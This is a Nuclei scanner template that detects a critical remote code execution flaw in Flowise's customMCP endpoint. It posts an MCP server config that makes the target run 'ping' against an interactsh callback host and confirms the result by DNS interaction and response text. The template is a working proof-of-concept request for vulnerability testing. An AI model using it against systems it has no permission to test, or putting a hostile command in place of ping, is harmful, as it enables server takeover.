id: Flowise-customMCP-RCE
info:
  name: Flowise-customMCP-RCE
  author: iSee857
  severity: critical
  description: |
    Flowise-customMCP-RCE
  metadata:
    verified: true
    max-request: 1

http:
  - raw:
      - |
        POST /api/v1/node-load-method/customMCP HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        x-request-from: internal

        {
            "inputs": {
                "mcpServerConfig": {
                    "command": "ping",
                    "args": [
                        "{{interactsh-url}}",
                        "-c",
                        "4"
                    ]
                }
            },
            "loadMethod": "listActions"
        }

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: status
        status:
          - 200
      - type: word  
        words:
          - 'No Available Actions'
